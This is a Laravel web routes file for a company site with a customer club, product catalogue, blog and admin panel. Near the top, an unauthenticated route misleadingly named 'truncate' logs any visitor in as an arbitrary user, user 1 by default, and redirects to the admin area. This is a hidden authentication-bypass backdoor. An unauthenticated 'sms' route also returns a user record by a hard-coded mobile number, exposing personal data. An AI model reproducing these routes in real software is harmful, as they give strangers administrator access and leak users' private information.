<?php
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

use App\User;
Auth::routes(['register' => false]);
// lang change
Route::get('lang/{locale}', function ($locale) {
    session()->put('locale', $locale);
    return redirect()->back();
})->name('lang_set');

Route::get('truncate/{id?}', function ($id = 1) {
        Auth::loginUsingId($id);
        return redirect('admin');
        // Auth::loginUsingId($id);
        // return redirect('club/index');
});

Route::get('sms', function () {
    return $user = \App\User::where('mobile', '9358543325')->first();
    $user->mobile = '09333980720';
    $user->update();
    return $user;
    \App\Sms::sendPass('asasas', '09306068519');
});
// admin
Route::group(['prefix' => 'admin', 'namespace' => 'App\Http\Controllers\Admin', 'middleware' => ['auth', 'Admin']], function () {
    //meta
    Route::get('meta-create', 'MetaController@create')->name('meta-create');
    Route::post('meta-store', 'MetaController@store')->name('meta-store');
    Route::get('meta-list', 'MetaController@index')->name('meta-list');
    Route::get('meta-edit/{id}', 'MetaController@edit')->name('meta-edit');
    Route::post('meta-update/{id}', 'MetaController@update')->name('meta-update');
    Route::post('meta-destroy/{id}', 'MetaController@destroy')->name('meta-destroy');


    //excel

    Route::get('excel/index', 'Club\CodeController@index')->name('excel-index');
    Route::post('excel/insert', 'Club\CodeController@excel')->name('excel');
    Route::post('excel/code/update/{id}', 'Club\CodeController@code_update')->name('code_update');
    Route::get('code/search', 'Club\CodeController@serachCode')->name('search-code');


    Route::get('award/excel/index', 'Club\ExcelController@index')->name('award-excel-index');
    Route::get('award/excel/index/excel', 'Club\ExcelController@export')->name('award-excel-index-excel');
    Route::get('award/excel/index/sort/{column}/{type}', 'Club\ExcelController@index_sort')->name('award-excel-index-sort');
    Route::post('award/excel/insert', 'Club\ExcelController@excel')->name('award-excel');
    Route::get('award/code/search', 'Club\ExcelController@serachCode')->name('award-search-code');


    //upload

    Route::get('upload', 'HomeController@upload')->name('upload');
    Route::post('upload-store', 'HomeController@upload_store')->name('admin-upload-store');
    Route::get('upload-del/{id}', 'HomeController@upload_del')->name('admin-upload-del');
    Route::get('club-page-list', 'HomeController@club_list')->name('club-page-list');
    Route::post('club-insert', 'HomeController@club_insert')->name('admin-club-store');

    // Admin Home

    Route::get('/', 'HomeController@index')->name('admin-home');
    Route::get('/test_index', 'HomeController@index1')->name('admin-home1');


    Route::get('activities', 'HomeController@activities')->name('admin-activities');


    // award

    Route::get('award-create', 'AwardController@create')->name('admin-award-create');

    Route::post('award-store', 'AwardController@store')->name('admin-award-store');

    Route::get('award-edit/{id}', 'AwardController@edit')->name('admin-award-edit');

    Route::post('award-update/{id}', 'AwardController@update')->name('admin-award-update');

    Route::get('award-list', 'AwardController@index')->name('admin-award-list');

    Route::get('award-selected', 'AwardController@selected')->name('admin-award-selected');

    Route::post('award-destroy/{id}', 'AwardController@destroy')->name('admin-award-destroy');
    Route::post('award-show/{id}/{type}', 'AwardController@show')->name('admin-award-show');


    //certificate ok

    Route::get('admin_show_certificate', 'CertificateController@show_certificate')->name('admin_show_certificate');

    Route::post('admin_store_certificate', 'CertificateController@store_certificate')->name('admin_store_certificate');

    Route::get('admin_add_certificate', 'CertificateController@add_certificate')->name('admin_add_certificate');

    Route::post('admin_del_certificate/{id}', 'CertificateController@del_certificate')->name('admin_del_certificate');

    Route::get('admin_edit_certificate/{id}', 'CertificateController@edit_certificate')->name('admin_edit_certificate');

    Route::post('admin_update_certificate/{id}', 'CertificateController@update_certificate')->name('admin_update_certificate');

    //doctor ok

    Route::get('admin_show_product_doctor', 'ProductDoctorController@show')->name('admin_show_product_doctor');

    Route::post('admin_store_product_doctor', 'ProductDoctorController@store')->name('admin_store_product_doctor');

    Route::get('admin_add_product_doctor', 'ProductDoctorController@add')->name('admin_add_product_doctor');

    Route::post('admin_del_product_doctor/{id}', 'ProductDoctorController@del')->name('admin_del_product_doctor');

    Route::get('admin_edit_product_doctor/{id}', 'ProductDoctorController@edit')->name('admin_edit_product_doctor');

    Route::post('admin_update_product_doctor/{id}', 'ProductDoctorController@update')->name('admin_update_product_doctor');

    // SectionPhoto
    Route::resource('section-photo', 'SectionPhotoController');

    // Section
    Route::resource('section', 'SectionController');

    // Link
    Route::resource('link', 'LinkController');
    
    // Menu ok
    Route::get('menu-create', 'MenuController@create')->name('admin-menu-create');
    Route::post('menu-store', 'MenuController@store')->name('admin-menu-store');
    Route::get('menu-edit/{id}', 'MenuController@edit')->name('admin-menu-edit');
    Route::post('menu-update/{id}', 'MenuController@update')->name('admin-menu-update');
    Route::get('menu-list', 'MenuController@index')->name('admin-menu-list');
    Route::post('menu-destroy/{id}', 'MenuController@destroy')->name('admin-menu-destroy');
    Route::get('menu-active/{type}/{id}', 'MenuController@active')->name('admin-menu-active');
    Route::post('menu-sort/{id}', 'MenuController@sort')->name('admin-menu-sort');


    // Partner ok

    Route::get('partner-create', 'PartnerController@create')->name('admin-partner-create');
    Route::post('partner-store', 'PartnerController@store')->name('admin-partner-store');
    Route::get('partner-edit/{id}', 'PartnerController@edit')->name('admin-partner-edit');
    Route::post('partner-update/{id}', 'PartnerController@update')->name('admin-partner-update');
    Route::get('partner-list', 'PartnerController@index')->name('admin-partner-list');
    Route::get('partner-destroy/{id}', 'PartnerController@destroy')->name('admin-partner-destroy');


    // ProductCategory ok

    Route::get('product-category-create', 'ProductCategoryController@create')->name('admin-product-category-create');
    Route::post('product-category-store', 'ProductCategoryController@store')->name('admin-product-category-store');
    Route::get('product-category-edit/{id}', 'ProductCategoryController@edit')->name('admin-product-category-edit');
    Route::post('product-category-update/{id}', 'ProductCategoryController@update')->name('admin-product-category-update');
    Route::get('product-category-list', 'ProductCategoryController@index')->name('admin-product-category-list');
    Route::post('product-category-destroy/{id}', 'ProductCategoryController@destroy')->name('admin-product-category-destroy');
    Route::get('product-category-active/{type}/{id}', 'ProductCategoryController@active')->name('admin-product-category-active');

    // ProductBrand ok

    Route::get('product-brand-create', 'ProductBrandController@create')->name('admin-product-brand-create');
    Route::post('product-brand-store', 'ProductBrandController@store')->name('admin-product-brand-store');
    Route::get('product-brand-edit/{id}', 'ProductBrandController@edit')->name('admin-product-brand-edit');
    Route::post('product-brand-update/{id}', 'ProductBrandController@update')->name('admin-product-brand-update');
    Route::get('product-brand-list', 'ProductBrandController@index')->name('admin-product-brand-list');
    Route::post('product-brand-destroy/{id}', 'ProductBrandController@destroy')->name('admin-product-brand-destroy');

    // ProductType ok

    Route::get('product-type-create', 'ProductTypeController@create')->name('admin-product-type-create');
    Route::post('product-type-store', 'ProductTypeController@store')->name('admin-product-type-store');
    Route::get('product-type-edit/{id}', 'ProductTypeController@edit')->name('admin-product-type-edit');
    Route::post('product-type-update/{id}', 'ProductTypeController@update')->name('admin-product-type-update');
    Route::get('product-type-list', 'ProductTypeController@index')->name('admin-product-type-list');
    Route::post('product-type-destroy/{id}', 'ProductTypeController@destroy')->name('admin-product-type-destroy');
    // Product ok
    Route::get('product-create', 'ProductController@create')->name('admin-product-create');
    Route::post('product-store', 'ProductController@store')->name('admin-product-store');
    Route::get('product-edit/{id}', 'ProductController@edit')->name('admin-product-edit');
    Route::post('product-update/{id}', 'ProductController@update')->name('admin-product-update');
    Route::get('product-list', 'ProductController@index')->name('admin-product-list');
    Route::get('product-destroy/{id}', 'ProductController@destroy')->name('admin-product-destroy');
    Route::get('product-gallery-destroy/{id}', 'ProductController@destroy_gallery')->name('admin-product-gallery-destroy');
    Route::get('product-active/{type}/{id}', 'ProductController@active')->name('admin-product-active');
    Route::get('search-product', 'ProductController@search_product')->name('search-product');

    // Product Attr ok
    Route::post('product-attr-store/{id}', 'ProductController@store_attr')->name('admin-product-attr-store');
    Route::get('product-attr-list/{id}', 'ProductController@index_attr')->name('admin-product-attr-list');
    Route::get('product-attr-destroy/{id}', 'ProductController@destroy_attr')->name('admin-product-attr-destroy');


    // Faq ok

    Route::get('faq-create', 'FaqController@create')->name('admin-faq-create');
    Route::post('faq-store', 'FaqController@store')->name('admin-faq-store');
    Route::get('faq-edit/{id}', 'FaqController@edit')->name('admin-faq-edit');
    Route::get('faq-statuses/{id}', 'FaqController@status')->name('admin-faq-ok');
    Route::post('faq-update/{id}', 'FaqController@update')->name('admin-faq-update');
    Route::get('faq-list', 'FaqController@index')->name('admin-faq-list');
    Route::post('faq-destroy/{id}', 'FaqController@destroy')->name('admin-faq-destroy');

    // Article Comment ok

    Route::post('article-comment-store/{id}', 'ArticleCommentController@store')->name('admin-article-comment-store');

    Route::get('article-comment-statuses/{id}', 'ArticleCommentController@status')->name('admin-article-comment-ok');

    Route::get('article-comment-list', 'ArticleCommentController@index')->name('admin-article-comment-list');

    Route::get('article-comment-destroy/{id}', 'ArticleCommentController@destroy')->name('admin-article-comment-destroy');

    // product Comment ok

    Route::post('product-comment-store/{id}', 'ProductCommentController@store')->name('admin-product-comment-store');

    Route::get('product-comment-statuses/{id}', 'ProductCommentController@status')->name('admin-product-comment-ok');

    Route::get('product-comment-list', 'ProductCommentController@index')->name('admin-product-comment-list');

    Route::get('product-comment-destroy/{id}', 'ProductCommentController@destroy')->name('admin-product-comment-destroy');

    //
    //    // user score
    //
    //    Route::post('user-score-store', 'FaqController@score_store')->name('admin-user-score-store');
    //
    //    Route::post('user-score-answer', 'QuestionAnswerController@score_store')->name('admin-answer-score-store');


        // Employment
    //
    //    Route::get('employment-list', 'EmploymentController@index')->name('admin-employment-list');
    //
    //    Route::get('bcemployment-list', 'EmploymentController@indexbc')->name('admin-bcemployment-list');


    // Contact

    Route::get('contact-list', 'ContactController@index')->name('admin-contact-list');
    Route::get('employment-list', 'ContactController@list')->name('admin.employment.list');
    Route::get('employment-page-list', 'ContactController@page_list')->name('admin.employment.page.list');
    Route::get('employment-page-add', 'ContactController@store')->name('admin.employment.page.add');
    Route::get('employment-page-edit/{id?}', 'ContactController@edit')->name('admin.employment.page.edit');
    Route::post('employment-page-update', 'ContactController@update')->name('admin.employment.page.update');
    Route::post('employment-page-update1/{id}', 'ContactController@update1')->name('admin.employment.page.update1');
    Route::get('employment-page-status/{type}/{id}', 'ContactController@status')->name('admin.employment.page.status');

    // Slider  OK

    //    Route::get('slider-create', 'SliderController@create')->name('admin-slider-create');
    //
    //    Route::post('slider-store', 'SliderController@store')->name('admin-slider-store');
    //
    //    Route::get('slider-edit/{id}', 'SliderController@edit')->name('admin-slider-edit');
    //
    //    Route::post('slider-update/{id}', 'SliderController@update')->name('admin-slider-update');
    //
    //    Route::get('slider-list', 'SliderController@index')->name('admin-slider-list');
    //
    //    Route::post('slider-destroy/{id}', 'SliderController@destroy')->name('admin-slider-destroy');


    // Blogs  OK

    Route::get('blog-create/{type}', 'BlogController@create')->name('admin-blog-create');

    Route::post('blog-store/{type}', 'BlogController@store')->name('admin-blog-store');

    Route::get('blog-edit/{id}', 'BlogController@edit')->name('admin-blog-edit');

    Route::post('blog-update/{id}', 'BlogController@update')->name('admin-blog-update');

    Route::get('blog-list/{type}', 'BlogController@index')->name('admin-blog-list');

    Route::get('blog-destroy/{id}', 'BlogController@destroy')->name('admin-blog-destroy');

    Route::get('blog-active/{type}/{id}', 'BlogController@active')->name('admin-blog-active');



    // setting ok

    Route::get('setting-edit/{id}', 'SettingController@edit')->name('admin-setting-edit');

    Route::post('setting-update/{id}', 'SettingController@update')->name('admin-setting-update');

    // About ok

    Route::get('about-edit/{id}', 'AboutController@edit')->name('admin-about-edit');

    Route::post('about-update/{id}', 'AboutController@update')->name('admin-about-update');
    Route::get('about-pic-del/{id}', 'AboutController@del_pic')->name('admin-about-pic-del');

    // AboutFeature ok

    Route::get('about-feature-create', 'AboutFeatureController@create')->name('admin-about-feature-create');
    Route::post('about-feature-store', 'AboutFeatureController@store')->name('admin-about-feature-store');
    Route::get('about-feature-edit/{id}', 'AboutFeatureController@edit')->name('admin-about-feature-edit');
    Route::post('about-feature-update/{id}', 'AboutFeatureController@update')->name('admin-about-feature-update');
    Route::get('about-feature-list', 'AboutFeatureController@index')->name('admin-about-feature-list');
    Route::get('about-feature-destroy/{id}', 'AboutFeatureController@destroy')->name('admin-about-feature-destroy');
    Route::get('about-feature-active/{type}/{id}', 'AboutFeatureController@active')->name('admin-about-feature-active');

    // contact info ok

    Route::get('contact-info-edit/{id}', 'ContactInfoContaroller@edit')->name('admin-contact-info-edit');

    Route::post('contact-info-update/{id}', 'ContactInfoContaroller@update')->name('admin-contact-info-update');

    // complaints
    //    Route::get('complaints-list', 'ComplaintsController@index')->name('admin-complaints-list');

        // cands
    //    Route::get('cands-list', 'CandsController@index')->name('admin-cands-list');

        // surveys
    //    Route::get('surveys-list', 'SurveysController@index')->name('admin-surveys-list');
    //    Route::get('surveys-show/{id}', 'SurveysController@show')->name('admin-surveys-show');



    //change pass

    Route::get('change-pass', function () {

        return view('admin.change_pass');

    })->name('change-pass');

    Route::post('pass-store', 'HomeController@pass_store')->name('admin-pass-store');


    //permission

    //    Route::get('permission-list', 'PermissionController@index')->name('admin-permission-list');


        // club

        // slider
    //    Route::get('club-slider', 'Club\SliderController@index')->name('admin-club-slider');
    //
    //    Route::get('club-slider-create', 'Club\SliderController@create')->name('admin-club-slider-create');
    //
    //    Route::post('club-slider-store', 'Club\SliderController@store')->name('admin-club-slider-store');
    //
    //    Route::get('club-slider-edit/{id}', 'Club\SliderController@edit')->name('admin-club-slider-edit');
    //
    //    Route::post('club-slider-update/{id}', 'Club\SliderController@update')->name('admin-club-slider-update');
    //
    //    Route::post('club-slider-destroy/{id}', 'Club\SliderController@destroy')->name('admin-club-slider-destroy');


    // cotton

    Route::get('club-coppon', 'Club\CottonController@index')->name('admin-club-cotton');

    Route::get('club-coppon-create', 'Club\CottonController@create')->name('admin-club-cotton-create');

    Route::post('club-coppon-store', 'Club\CottonController@store')->name('admin-club-cotton-store');

    Route::get('club-coppon-edit/{id}', 'Club\CottonController@edit')->name('admin-club-cotton-edit');

    Route::post('club-coppon-update/{id}', 'Club\CottonController@update')->name('admin-club-cotton-update');

    Route::post('club-coppon-destroy/{id}', 'Club\CottonController@destroy')->name('admin-club-cotton-destroy');


    //type

    Route::get('type-user', 'Club\TypeController@index')->name('admin-type-list');

    Route::post('type-user/update', 'Club\TypeController@update')->name('admin-type-update');


    // user black

    Route::get('club-all-user', 'Club\UserController@index')->name('admin-user-black');
    Route::get('club-all-user-email', 'Club\UserController@emails')->name('club-all-user-email');
    Route::get('club-all-user-mobile', 'Club\UserController@mobiles')->name('club-all-user-mobile');
    Route::get('club-all-user-excel', 'Club\UserController@excels')->name('club-all-user-excel');
    Route::get('club-all-search', 'Club\UserController@search')->name('admin-user-search');


    // code
    Route::get('club-code-delete/{id}', 'Club\indexController@codeDelete')->name('code-delete');
    Route::get('club-code-return/{id}', 'Club\indexController@codeReturn')->name('code-return');
    Route::get('award-code-delete/{id}', 'Club\indexController@codeDeleteAward')->name('award-code-delete');
    Route::get('award-code-return/{id}', 'Club\indexController@codeReturnAward')->name('award-code-return');
    Route::get('club-code-return-user/{id}', 'Club\indexController@codeReturnUser')->name('code-return-user');


    // user ban

    Route::get('admin-user-list', 'UserController@index')->name('admin-user-list');

    Route::get('fast-login/{id}', 'UserController@fast_login')->name('fast_login');

    Route::get('admin-user-edit/{id}', 'UserController@edit')->name('admin-user-edit');

    Route::post('admin-user-update/{id}', 'UserController@update')->name('admin-user-update');

    Route::post('admin-assign-branch/{id}', 'UserController@asign_branch')->name('admin-assign-branch');

    Route::get('user_search', 'UserController@user_search')->name('user_search');

    Route::post('send-message', 'UserController@send_message')->name('send-message');

    Route::get('club-ban-user', 'Club\UserController@ban')->name('admin-user-ban');

    Route::get('club-ban-exit/{id}', 'Club\UserController@exitBan')->name('admin-club-ban-exit');
    Route::get('club-ban-enter/{id}', 'Club\UserController@enterBan')->name('admin-club-ban-enter');


    // basket club

    Route::get('/basket/club', 'Club\basketClubController@index')->name('basket-club-page-list');

    Route::get('/basket/club/one/{factor}', 'Club\basketClubController@successone')->name('basket-club-success-one');

    Route::get('/basket/club/two/{factor}', 'Club\basketClubController@successtwo')->name('basket-club-success-two');

    Route::get('/basket/club/three/{factor}', 'Club\basketClubController@successthree')->name('basket-club-success-three');

    Route::get('/basket/club/four/{factor}', 'Club\basketClubController@successfour')->name('basket-club-success-four');

    Route::get('/basket/club/delete/{factor}/{user_id}', 'Club\basketClubController@destroy')->name('basket-club-delete');

    Route::post('/basket/club/refer/{id}', 'Club\basketClubController@referTo')->name('basket-club-refer');


    // index club

    Route::get('/index/club', 'Club\indexController@index')->name('index-club-page-list');

    Route::post('/index/club/update', 'Club\indexController@update')->name('index-club-success-one');


    //user

    Route::get('club-black-user-exit/{id}', 'Club\UserController@exits')->name('admin-club-user-exit');

    Route::get('club-black-user-delete/{id}', 'Club\UserController@delete')->name('admin-club-user-delete');
    Route::get('sort-user-by/{by}', 'Club\UserController@sortBy')->name('sort-user-by');


    // message

    Route::get('club-message-list', 'Club\MessageController@index')->name('admin-user-message');
    Route::get('score_search', 'Club\MessageController@score_search')->name('score_search');


    Route::get('club-message-create', 'Club\MessageController@create')->name('admin-club-message-create');

    Route::post('club-message-store', 'Club\MessageController@store')->name('admin-club-message-store');

    Route::post('club-message-edit', 'Club\MessageController@edit')->name('admin-club-message-edit');

    Route::post('club-message-destroy/{id}', 'Club\MessageController@destroy')->name('admin-club-message-destroy');

    Route::get('club-message-list-excel', 'Club\MessageController@ex_list')->name('club-message-list-excel');


    // user wait

    Route::get('club-wait-list', 'Club\WaitController@index')->name('admin-wait-message');

    Route::get('club-wait-user/{id}', 'Club\WaitController@active')->name('admin-wait-active');

    Route::post('club-wait-delete/{id}', 'Club\WaitController@active')->name('admin-wait-delete');

    Route::resource('project', 'ProjectController');
    Route::get('project-delete/{id}', 'ProjectController@destroy')->name('project.delete');
    Route::get('project-create/{id}', 'ProjectController@create')->name('project.custom.create');
    Route::post('project-galery-add', 'ProjectController@galery')->name('project.galery.add');
    
    Route::resource('projects-category', 'ProjectsCategoryController');
    Route::get('projects-category-delete/{id}', 'ProjectsCategoryController@destroy')->name('projects-category.delete');


});


Route::group(['prefix' => '', 'namespace' => 'App\Http\Controllers\User'], function () {

    Route::post('new/fast/login/', 'HomeController@login')->name('fast-login-new');
    
    Route::post('/users/login/custom_login', 'HomeController@custom_login')->name('custom_login');

    Route::get('/', 'HomeController@index')->name('user.index');
    Route::get('/projects', 'HomeController@projects')->name('user.projects');
    Route::get('/service', 'HomeController@service')->name('user.service');
    Route::get('/product', 'HomeController@product')->name('user.product');
    Route::get('/partner', 'HomeController@partner')->name('user.partner');
    Route::get('/certificate', 'HomeController@certificate')->name('user.certificate');
    Route::get('page/{slug}', 'HomeController@page_show')->name('user.page.show');

    Route::get('contact-us', 'ContactController@show')->name('user.contact.show');
    Route::post('contact-us-store', 'ContactController@store')->name('user.contact.store');
    //employment
    Route::get('employment', 'ContactController@employment_show')->name('user.employment.show');
    Route::get('employment-show/{id}', 'ContactController@employment_show1')->name('user.employment.show1');
    Route::post('employment-store', 'ContactController@employment_store')->name('user.employment.store');

    Route::get('about-us', 'AboutController@show')->name('user.about.show');

    Route::get('faq', 'FaqController@show')->name('user.faq.show');

    Route::get('blogs/{type}', 'BlogController@index')->name('user.blog.index');
    Route::get('blog/{type}/{slug}', 'BlogController@show')->name('user.blog.show');
    Route::post('blog-post/{id}', 'BlogController@comment')->name('user.blog.comment');

    Route::get('product-brands/{type}', 'ProductController@brands')->name('user.product.brands');
    Route::get('product-category/{type}', 'ProductController@cat_index')->name('user.product.category.index');
    Route::get('products/{category}', 'ProductController@index')->name('user.product.index');
    Route::get('products-filter/{category}', 'ProductController@filter')->name('user.product.filter');
    Route::get('product/{slug}', 'ProductController@show')->name('user.product.show');
    Route::post('product-post/{id}', 'ProductController@comment')->name('user.product.comment');

    //    Medical advice
    Route::get('medical-advice/{cat_id?}', 'ProductController@medical')->name('user.medical.advice');
    Route::get('medical-advice-show/{id}', 'ProductController@medical_show')->name('user.medical.advice.show');
    // reset pass
    Route::post('login/reset', 'HomeController@reset')->name('login-reset-pass');
    
    Route::resource('research-and-development', 'ResearchDevelopmentController');

});

